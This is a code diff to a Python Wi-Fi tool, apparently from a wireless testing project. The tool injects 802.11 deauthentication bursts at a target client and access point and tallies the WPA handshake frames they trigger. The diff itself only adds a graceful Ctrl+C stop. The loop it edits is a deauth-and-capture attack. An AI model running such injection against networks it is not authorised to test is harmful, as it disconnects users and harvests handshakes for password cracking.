@@ -40,6 +40,8 @@ sys.path.insert(0, str(Path(__file__).parent.parent.parent / "src"))
 import libusb_package
 import usb.core
 
+from _hwstop import install_stop, sleep_or_stop
+
 from wifit3.chips.rtl8821au_dkms.driver import Rtl8821auDkmsDriver
 
 
@@ -140,6 +142,7 @@ async def run(args) -> int:
     except usb.core.USBError as e:
         logging.debug("set_configuration: %s", e)
 
+    stop = install_stop(asyncio.get_running_loop())   # Ctrl+C -> graceful stop
     driver = Rtl8821auDkmsDriver.from_usb_device(dev, entry)
     tally = _HandshakeTally(args.bssid, client)
     driver.register_rx_callback(tally)   # listen for the deauth's effect (handshake)
@@ -166,22 +169,22 @@ async def run(args) -> int:
     start = time.monotonic()
     sent = 0
     try:
-        while time.monotonic() - start < args.listen:
+        while not stop.is_set() and time.monotonic() - start < args.listen:
             for _ in range(args.count):                 # one deauth burst
+                if stop.is_set():
+                    break
                 if await driver.inject_frame(client_deauth):
                     sent += 1
                 if await driver.inject_frame(ap_deauth):
                     sent += 1
                 await asyncio.sleep(0.005)
-            # listen between bursts so the client can reconnect + we catch the handshake
-            await asyncio.sleep(args.interval)
+            # listen between bursts (Ctrl+C-interruptible) so the client reconnects
+            await sleep_or_stop(stop, args.interval)
             print(f"\r  {time.monotonic() - start:4.0f}s  sent={sent}  "
                   f"ap_beacons={tally.ap_beacons}  client_frames={tally.client_frames}  "
                   f"eapol={tally.client_eapol}/{tally.eapol}  "
                   f"M2M4={tally.eapol_to_ap} M1M3={tally.eapol_from_ap}  "
                   f"toDS={tally.tods_data}", end="")
-    except KeyboardInterrupt:
-        pass
     except usb.core.USBError as e:
         print(f"\n[FAIL] bulk-OUT error after {sent} frames: {e} "
               f"(if the pipe wedged, unplug/replug and rerun)")
